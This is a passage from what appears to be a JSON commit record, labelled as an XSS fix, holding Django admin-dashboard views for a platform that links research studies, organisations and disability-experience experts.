selected_limitation in selected_limitation_int:\n                if selected_limitation not in old_limitations:\n                    onderzoek_beperking = BeperkingenOnderzoeken(\n                        beperking_id=int(selected_limitation),\n                        onderzoeks_id=pk,\n                    )\n                    onderzoek_beperking.save()\n\n            serializer.save()\n            return redirect(f\"/beheerder/dashboard/research/{pk}\")\n        print(serializer.errors)\n        return HttpResponse(status=400)\n    return redirect(f\"/beheerder/dashboard/research/{pk}\")\n\n\n@staff_member_required\ndef experience_expert_item(request, pk):\n    experience_expert_item_data = User.objects.get(pk=pk)\n\n    limitation_ids = BeperkingenErvaringsdeskundigen.objects.filter(\n        ervaringsdeskundigen_id=experience_expert_item_data.id\n        ).values_list('beperking_id', flat=True)\n    limitations = Beperkingen.objects.filter(id__in=limitation_ids)\n\n    context = {\n        \"data\": experience_expert_item_data,\n        'limitations': limitations,\n    }\n    return render(\n        request,\n        \"beheerder/dashboard/dashboard_experience_expert_item.html\",\n        context\n        )\n\n\n@staff_member_required\ndef experience_expert_item_edit(request, pk):\n    experience_expert_item_data = User.objects.get(pk=pk)\n    experience_expert_item_data.geboortedatum = str(\n        experience_expert_item_data.geboortedatum\n        )\n\n    limitation_ids = BeperkingenErvaringsdeskundigen.objects.filter(\n        ervaringsdeskundigen_id=experience_expert_item_data.id\n        ).values_list('beperking_id', flat=True)\n    experience_expert_limitations = Beperkingen.objects.filter(\n        id__in=limitation_ids\n        )\n    all_limitations = Beperkingen.objects.all()\n\n    experience_expert_limitations_id_list = []\n    for limitation in experience_expert_limitations:\n        experience_expert_limitations_id_list.append(limitation.id)\n\n    context = {\n        \"data\": experience_expert_item_data,\n        'experience_expert_limitations_id_list': experience_expert_limitations_id_list,\n        'all_limitations': all_limitations,\n    }\n    return render(\n        request,\n        \"beheerder/dashboard/dashboard_experience_expert_item_edit.html\",\n        context\n        )\n\n\n@staff_member_required\ndef experience_expert_item_edit_save(request, pk):\n    if request.method == 'POST':\n        instance = User.objects.get(pk=pk)\n        data = request.POST\n        serializer = ExperienceExpertSerializer(instance, data)\n        if serializer.is_valid():\n            old_limitations = BeperkingenErvaringsdeskundigen.objects.filter(\n                ervaringsdeskundigen_id=pk\n                ).values_list('beperking_id', flat=True)\n            selected_limitations = request.POST.getlist(\n                \"selected_limitations[]\"\n                )\n\n            selected_limitation_int = []\n            for selected_limitation in selected_limitations:\n                selected_limitation_int.append(int(selected_limitation))\n\n            for limit in old_limitations:\n                if limit not in selected_limitation_int:\n                    deletable = BeperkingenErvaringsdeskundigen.objects.filter(\n                        ervaringsdeskundigen_id=pk\n                        ).filter(beperking_id=limit)\n                    deletable.delete()\n\n            for selected_limitation in selected_limitation_int:\n                if selected_limitation not in old_limitations:\n                    onderzoek_beperking = BeperkingenErvaringsdeskundigen(\n                        beperking_id=int(selected_limitation),\n                        ervaringsdeskundigen_id=pk,\n                    )\n                    onderzoek_beperking.save()\n\n            serializer.save()\n            return redirect(f\"/beheerder/dashboard/experience_expert/{pk}\")\n        return HttpResponse(status=400)\n    return redirect(f\"/beheerder/dashboard/experience_expert/{pk}\")\n\n\n@staff_member_required\ndef organization_item(request, pk):\n    organization_item_data = Organisaties.objects.get(pk=pk)\n    context = {\n        \"data\": organization_item_data\n    }\n    return render(\n        request,\n        \"beheerder/dashboard/dashboard_organization_item.html\",\n        context\n        )\n\n\n@staff_member_required\ndef organization_item_edit(request, pk):\n    organization_item_data = Organisaties.objects.get(pk=pk)\n    context = {\n        \"data\": organization_item_data\n    }\n    return render(\n        request,\n        \"beheerder/dashboard/dashboard_organization_item_edit.html\",\n        context\n        )\n\n\n@staff_member_required\ndef organization_item_edit_save(request, pk):\n    if request.method == 'POST':\n        instance = Organisaties.objects.get(pk=pk)\n        data = request.POST\n        serializer = OrganisatieSerializer(instance, data)\n        if serializer.is_valid():\n            serializer.save()\n            return redirect(f\"/beheerder/dashboard/organization/{pk}\")\n        return HttpResponse(status=400)\n    return redirect(f\"/beheerder/dashboard/organization/{pk}\")\n\n\n@staff_member_required\ndef attendance_request_item(request, pk):\n    attendance_request_item_data = Deelnames.objects.select_related(\n        'onderzoeks'\n        ).select_related('ervaringsdeskundige').get(pk=pk)\n\n    experience_expert_limitation_ids = BeperkingenErvaringsdeskundigen.objects.filter(\n        ervaringsdeskundigen_id=attendance_request_item_data.ervaringsdeskundige.pk\n        ).values_list('beperking_id', flat=True)\n    experience_expert_limitations = Beperkingen.objects.filter(\n        id__in=experience_expert_limitation_ids\n        )\n\n    research_limitation_ids = BeperkingenOnderzoeken.objects.filter(\n        onderzoeks_id=attendance_request_item_data.onderzoeks.pk\n        ).values_list('beperking_id', flat=True)\n    research_limitations = Beperkingen.objects.filter(\n        id__in=research_limitation_ids\n        )\n\n    context = {\n        \"data\": attendance_request_item_data,\n        \"experience_expert_limitations\": experience_expert_limitations,\n        \"research_limitations\": research_limitations,\n    }\n\n    return render(\n        request,\n        \"beheerder/dashboard/dashboard_attendance_request_item.html\",\n        context)\n\n\n@staff_member_required\ndef attendance_request_item_edit(request, pk):\n    attendance_request_item_data = Deelnames.objects.select_related(\n        'onderzoeks'\n        ).select_related('ervaringsdeskundige').get(pk=pk)\n\n    experience_expert_limitation_ids = BeperkingenErvaringsdeskundigen.objects.filter(\n        ervaringsdeskundigen_id=attendance_request_item_data.ervaringsdeskundige.pk\n        ).values_list('beperking_id', flat=True)\n    experience_expert_limitations = Beperkingen.objects.filter(\n        id__in=experience_expert_limitation_ids\n        )\n\n    research_limitation_ids = BeperkingenOnderzoeken.objects.filter(\n        onderzoeks_id=attendance_request_item_data.onderzoeks.pk\n        ).values_list('beperking_id', flat=True)\n    research_limitations = Beperkingen.objects.filter(\n        id__in=research_limitation_ids\n        )\n\n    context = {\n        \"research_limitations\": research_limitations,\n        \"experience_expert_limitations\": experience_expert_limitations,\n        \"data\": attendance_request_item_data\n    }\n    return render(\n        request,\n        \"beheerder/dashboard/dashboard_attendance_request_item_edit.html\",\n        context\n        )\n\n\n@staff_member_required\ndef attendance_request_item_edit_save(request, pk):\n    if request.method == 'POST':\n        instance = Deelnames.objects.select_related(\n            'onderzoeks'\n            ).select_related('ervaringsdeskundige').get(pk=pk)\n        data = request.POST\n        if data['status']:\n            instance.status = data['status']\n            instance.contact = data['contact']\n            instance.save()\n            return redirect(f\"/beheerder/dashboard/attendance_request/{pk}\")\n        return HttpResponse(status=400)\n    return redirect(f\"/beheerder/dashboard/attendance_request/{pk}\")\n\n\n@staff_member_required\n@api_view(['GET'])\ndef get_dashboard(request):\n    data = dict()\n    list_research = Onderzoeken.objects.filter(\n        status=1\n        ).select_related(\"organisatie\")\n    count_research = list_research.count()\n    list_experience_expert = User.objects.filter(status=1)\n    count_experience_expert = list_experience_expert.count()\n    list_organization = Organisaties.objects.filter(status=1)\n    count_organization = list_organization.count()\n    list_attendance_request = Deelnames.objects.select_related(\n        'onderzoeks'\n        ).select_related('ervaringsdeskundige').filter(status=1)\n    count_attendance_request = list_attendance_request.count()\n\n    research_with_limitations = {}\n    experience_experts_with_limitations = {}\n\n    for research_item in list_research:\n        limitation_ids = BeperkingenOnderzoeken.objects.filter(\n            onderzoeks_id=research_item.onderzoeks_id\n            ).values_list('beperking_id', flat=True)\n        limitations = Beperkingen.objects.filter(id__in=limitation_ids)\n\n        research_with_limitations[research_item.onderzoeks_id] = {\n            'research': research_item,\n            'limitations': limitations,\n        }\n\n    for experience_expert in list_experience_expert:\n        limitation_ids = BeperkingenErvaringsdeskundigen.objects.filter(\n            ervaringsdeskundigen_id=experience_expert.id\n            ).values_list('beperking_id', flat=True)\n        limitations = Beperkingen.objects.filter(id__in=limitation_ids)\n\n        experience_experts_with_limitations[experience_expert.id] = {\n            'experience_expert': experience_expert,\n            'limitations': limitations,\n        }\n\n    context = {\n        'research': research_with_limitations,\n        'count_research': count_research,\n        'experience_expert': experience_experts_with_limitations,\n        'count_experience_expert': count_experience_expert,\n        'organization': list_organization,\n        'count_organization': count_organization,\n        'attendance_request': list_attendance_request,\n        'count_attendance_request': count_attendance_request,\n    }\n\n    data['research'] = render_to_string(\n        \"beheerder/dashboard/dashboard_research.html\",\n        context,\n        request\n        )\n    data['experience_expert'] = render_to_string(\n        \"beheerder/dashboard/dashboard_experience_expert.html\",\n        context,\n        request\n        )\n    data['organization'] = render_to_string(\n        \"beheerder/dashboard/dashboard_organization.html\",\n        context,\n        request\n        )\n    data['attendance_request'] = render_to_string(\n        \"beheerder/dashboard/dashboard_attendance_request.html\",\n        context,\n        request\n        )\n\n    return JsonResponse(data)\n"
                }
            },
            "msg": "XSS Vulnerabilities fix"
        }
    }
}